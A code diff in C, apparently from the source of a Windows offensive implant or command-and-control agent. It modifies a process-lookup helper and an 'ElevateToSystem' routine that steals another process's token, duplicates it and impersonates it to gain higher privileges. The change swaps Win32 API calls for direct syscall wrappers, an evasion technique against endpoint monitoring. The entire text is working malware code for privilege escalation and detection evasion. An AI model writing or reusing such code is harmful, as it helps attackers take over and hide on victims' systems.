@@ -41,7 +41,7 @@ DWORD GetProcessIdByName(WCHAR* processName)
     pe32.dwSize = sizeof(PROCESSENTRY32W);
     if ( ! Instance.Win32.Process32FirstW( hProcessSnap, &pe32 ) )
     {
-        Instance.Win32.NtClose( hProcessSnap );
+        SysNtClose( hProcessSnap );
         return Pid;
     }
 
@@ -54,7 +54,7 @@ DWORD GetProcessIdByName(WCHAR* processName)
 
     } while (Instance.Win32.Process32NextW(hProcessSnap, &pe32));
 
-    Instance.Win32.NtClose( hProcessSnap );
+    SysNtClose( hProcessSnap );
     return Pid;
 }
 
@@ -92,34 +92,32 @@ BOOL ElevateToSystem()
     hProcess = ProcessOpen( ProcessID, PROCESS_QUERY_LIMITED_INFORMATION );
     if ( hProcess )
     {
-        if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken ) ) )
+        if ( NT_SUCCESS( NtStatus = SysNtOpenProcessToken( hProcess, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken ) ) )
         {
-            if ( Win32_DuplicateTokenEx(
-                        hToken,
-                        TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
-                        NULL,
-                        SecurityImpersonation | SecurityIdentification, TokenPrimary, &hDupToken
-                    )
-                )
-            {
+            if ( TokenDuplicate(
+                hToken,
+                TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
+                SecurityImpersonation | SecurityIdentification, TokenPrimary,
+                &hDupToken
+            ) ) {
                 if ( Instance.Win32.ImpersonateLoggedOnUser( hDupToken ) )
                 {
                     ReturnValue = TRUE;
                 }
-                Instance.Win32.NtClose( hDupToken );
+                SysNtClose( hDupToken );
             }
             else
             {
                 PRINTF( "Win32_DuplicateTokenEx: Failed [%d]\n", Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
             }
-            Instance.Win32.NtClose( hToken );
+            SysNtClose( hToken );
         }
         else
         {
             PRINTF( "NtOpenProcessToken: Failed [%d]\n", Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
         }
 
-        Instance.Win32.NtClose( hProcess );
+        SysNtClose( hProcess );
     }
     else
     {
